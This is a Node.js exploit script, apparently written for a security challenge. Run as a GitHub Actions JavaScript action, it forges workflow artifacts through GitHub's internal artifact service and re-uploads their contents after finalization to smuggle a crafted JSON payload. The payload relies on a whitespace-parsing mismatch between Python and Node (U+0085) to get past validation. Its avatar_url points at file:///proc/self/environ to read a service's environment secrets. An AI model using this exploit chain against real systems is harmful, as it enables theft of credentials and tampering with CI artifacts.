// repo-cassette carrier builder / rsct prober.
//
// Measured so far:
//   * CreateArtifact + PUT + FinalizeArtifact all work from a JS action, and api.github.com serves
//     our exact bytes at /repos/{o}/{r}/actions/artifacts/{id}/zip  (BODY_MATCHES=true)
//   * the served Content-Type is NOT the blob's: GitHub's redirect pins it through the SAS "rsct"
//     parameter (rsct="application/zip"), so all five blob content types served as zip
//
// What the challenge needs: Python (requests) must see "application/json" after .strip() while
// Node must NOT see exactly "application/json" after .trim() (else it validates the repository
// name, and ours has extra path segments). Only U+0085 and U+001C..1F live in that gap, and Node
// refuses to re-emit U+001C..1F, so rsct has to look like "application/json\u0085".
//
// So: probe whether rsct depends on the artifact version/name, then build the carrier with the
// best variant found.

const https = require('node:https');
const { URL } = require('node:url');
const crypto = require('node:crypto');

const RESULTS = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL;
const RUNTIME = process.env.ACTIONS_RUNTIME_TOKEN;
const GH_TOKEN = process.env.GH_TOKEN;
const REPO = process.env.REPO;
const PAD_TO = 512;
const NEL = '\u0085';

if (!RUNTIME || !RESULTS) throw new Error('run this as a JS action (uses: ./), not a run: step');

function req(method, url, headers, body) {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = https.request({ method, hostname: u.hostname, path: u.pathname + u.search, headers },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => resolve({
          status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks),
        }));
      });
    r.on('error', reject);
    if (body) r.write(body);
    r.end();
  });
}

const ids = (() => {
  const payload = JSON.parse(Buffer.from(RUNTIME.split('.')[1], 'base64url').toString('utf8'));
  const scope = (Array.isArray(payload.scp) ? payload.scp.join(' ') : String(payload.scp || ''))
    .split(' ').find((s) => s.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  return { workflow_run_backend_id: run, workflow_job_run_backend_id: job };
})();

const twirp = (rpc, payload) => req('POST',
  `${RESULTS.replace(/\/$/, '')}/twirp/github.actions.results.api.v1.ArtifactService/${rpc}`,
  { 'content-type': 'application/json', authorization: `Bearer ${RUNTIME}` },
  JSON.stringify(payload));

const api = (path) => req('GET', `https://api.github.com${path}`, {
  authorization: `Bearer ${GH_TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'forge',
});

const putBlob = (signedUrl, bytes, contentType) => req('PUT', signedUrl, {
  'x-ms-blob-type': 'BlockBlob',
  'x-ms-version': '2021-08-06',
  'content-length': String(bytes.length),
  ...(contentType ? { 'x-ms-blob-content-type': contentType } : {}),
}, bytes);

// padded to a fixed size so the artifact id (length known only after finalize) never changes the
// byte count we declared at finalize time
function build(id) {
  const mk = (pad) => Buffer.from(JSON.stringify({
    full_name: `${REPO.toLowerCase()}/actions/artifacts/${id}/zip`,
    description: 'repo cassette'.padEnd(pad, '.'),
    stargazers_count: 0,
    owner: { login: 'rc', avatar_url: 'file:///proc/self/environ' },
  }), 'utf8');
  let pad = 13;
  while (mk(pad).length < PAD_TO) pad += 1;
  return mk(pad);
}

async function findId(name) {
  for (let i = 0; i < 10; i += 1) {
    const list = await api(`/repos/${REPO}/actions/artifacts?per_page=100`);
    if (list.status === 200) {
      const hit = (JSON.parse(list.body.toString('utf8')).artifacts || [])
        .filter((a) => a.name === name).sort((a, b) => b.id - a.id)[0];
      if (hit) return hit.id;
    }
    await new Promise((r) => setTimeout(r, 2000));
  }
  return null;
}

async function inspect(id) {
  const dl = await api(`/repos/${REPO}/actions/artifacts/${id}/zip`);
  if (!dl.headers.location) return { status: dl.status, rsct: null, served: null };
  const loc = new URL(dl.headers.location);
  const final = await req('GET', dl.headers.location, { 'user-agent': 'forge' });
  return {
    status: dl.status,
    rsct: loc.searchParams.get('rsct'),
    rscd: loc.searchParams.get('rscd'),
    served: final.headers['content-type'] || '',
    body: final.body,
  };
}

// usable = Python's strip() reduces it to application/json, JS's trim() does not
function usable(ct) {
  if (!ct) return false;
  const head = ct.split(',')[0].split(';')[0];
  const py = head.replace(/^[\s\u0085\u001c-\u001f]+|[\s\u0085\u001c-\u001f]+$/g, '').toLowerCase();
  return py === 'application/json' && head.trim().toLowerCase() !== 'application/json';
}

(async () => {
  const stamp = Date.now();
  // Final build: one artifact per candidate content type, each one re-PUT with the payload that
  // embeds its OWN id (the earlier run left the non-picked artifacts holding build(0), which is
  // why the replay hash did not match the fingerprint).
  //   text/plain       -> Node skips validation, so sourceSha256 = sha256(our bytes)
  //   application/json -> Python accepts the type on the direct origin re-check
  const wanted = [
    { version: 7, mime: 'text/plain', tag: 'plain' },
    { version: 7, mime: 'application/json', tag: 'json' },
  ].map((v) => ({ ...v, name: `${v.tag}-${stamp}` }));

  const out = [];
  for (const v of wanted) {
    const created = await twirp('CreateArtifact', {
      ...ids, name: v.name, version: v.version, mime_type: v.mime,
    });
    let signed;
    try { signed = JSON.parse(created.body.toString('utf8')).signed_upload_url; } catch { /* noop */ }
    if (!signed) {
      console.log(`[-] ${v.tag} CreateArtifact=${created.status} ${created.body.toString('utf8').slice(0, 140)}`);
      continue;
    }
    const placeholder = build(0);
    await putBlob(signed, placeholder, v.mime);
    const digest = `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`;
    const fin = await twirp('FinalizeArtifact', {
      ...ids, name: v.name, size: String(PAD_TO), hash: digest,
    });
    if (fin.status !== 200) {
      console.log(`[-] ${v.tag} finalize=${fin.status} ${fin.body.toString('utf8').slice(0, 140)}`);
      continue;
    }
    const id = await findId(v.name);
    if (!id) { console.log(`[-] ${v.tag} never listed`); continue; }

    // now that the id is known, overwrite the blob with the payload that references it
    const payload = build(id);
    const put2 = await putBlob(signed, payload, v.mime);
    const got = await inspect(id);
    console.log(`[*] ${v.tag} id=${id} rePUT=${put2.status} served=${JSON.stringify(got.served)}`
      + ` bodyMatches=${got.body ? got.body.equals(payload) : false}`);
    out.push({ ...v, id, served: got.served, body: got.body, payload });
  }

  console.log('\n===== HAND THIS BACK =====');
  for (const r of out) {
    console.log(`${r.tag.toUpperCase()}_ID=${r.id}`);
    console.log(`${r.tag.toUpperCase()}_CT=${JSON.stringify(r.served)}`);
    console.log(`${r.tag.toUpperCase()}_BODY_OK=${r.body ? r.body.equals(r.payload) : false}`);
    console.log(`${r.tag.toUpperCase()}_SHA256=${crypto.createHash('sha256').update(r.payload).digest('hex')}`);
  }
})().catch((e) => { console.error('[x]', e); process.exit(1); });